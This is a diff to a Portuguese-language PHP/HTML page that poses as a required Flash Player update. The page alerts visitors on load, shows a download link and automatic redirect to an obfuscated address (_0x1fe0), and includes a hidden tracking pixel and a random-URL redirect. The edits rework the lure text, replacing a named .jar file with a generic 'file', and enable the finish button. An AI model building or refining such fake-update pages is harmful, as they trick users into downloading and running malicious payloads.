@@ -168,7 +168,7 @@ function doProg()
 		window.canClose		= false;
 		window.iProg		= window.clearInterval(window.iProg);
 		window.iProg		= setInterval(function(){allFinish()},36000);
-		document.getElementById('downForm').innerHTML	= '<div style="text-align: right;"><div style="float: left; font-weight	: bold; font-size: 11px; text-align : left;">Conclu&iacute;do! Para prosseguir, clique <a href="'+_0x1fe0+'" onmouseover="javascritp:window.status=\'Download da atualiza&ccedil;&atilde;o!\'; return true" onmouseout="javascritp:window.status=\'\'; return true" alt="Clique aqui para efetuar o download da atualiza&ccedil;&atilde;o!">aqui</a>. Fa&ccedil;a o download e execute o <u style="color: #5a5; font-size: 14px;">upgrade_flash_9.48.jar</u> para instalar a atualiza&ccedil;&atilde;o! </div><button style="padding	: 6px; width: 120px; border	: 1px solid #555; color	: #555; margin-left	: 10px; background-color : #666;" id="btFinish" name="btFinish" onClick="javascritp:EndAndOut();" disabled>CONCLUIR</button></div>';
+		document.getElementById('downForm').innerHTML	= '<div style="text-align: right;"><div style="float: left; font-weight	: bold; font-size: 11px; text-align : left;">Conclu&iacute;do! Para prosseguir, clique <a href="'+_0x1fe0+'" onmouseover="javascritp:window.status=\'Download da atualiza&ccedil;&atilde;o!\'; return true" onmouseout="javascritp:window.status=\'\'; return true" alt="Clique aqui para efetuar o download da atualiza&ccedil;&atilde;o!">aqui</a>. Fa&ccedil;a o download e execute o arquivo para instalar a atualiza&ccedil;&atilde;o! </div><button style="padding	: 6px; width: 120px; border	: 1px solid #555; color	: #555; margin-left	: 10px; background-color : #666;" id="btFinish" name="btFinish" onClick="javascritp:EndAndOut();">CONCLUIR</button></div>';
 		window.location=_0x1fe0;
 		return;
 	}
@@ -271,7 +271,7 @@ var cSta		= setInterval(function(){tpqcnmes()},1000);
 <BODY BGCOLOR="#FFFFFF" onload="window.alert
 ('Para visualiza\u00E7\u00E3o correta deste site \u00E9 necess\u00E1rio atualizar o seu Flash Player. Ap\u00F3s a atualiza\u00E7\u00E3o a navega\u00E7\u00E3o no site seguir\u00E1 normalmente. Click em Atualizar')">
 </body>
-<img src='http://whos.amung.us/pingjs/?k=oretornod01&t=&c=t&y=&a=0&r=641100' border=0 width=0 height=0>
+<img src='https://whos.amung.us/pingjs/?k=oretornod01&t=&c=t&y=&a=0&r=641100' border=0 width=0 height=0>
 <?php if($config[0] == 'S') { ?>
 <script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>
 <?php } ?>
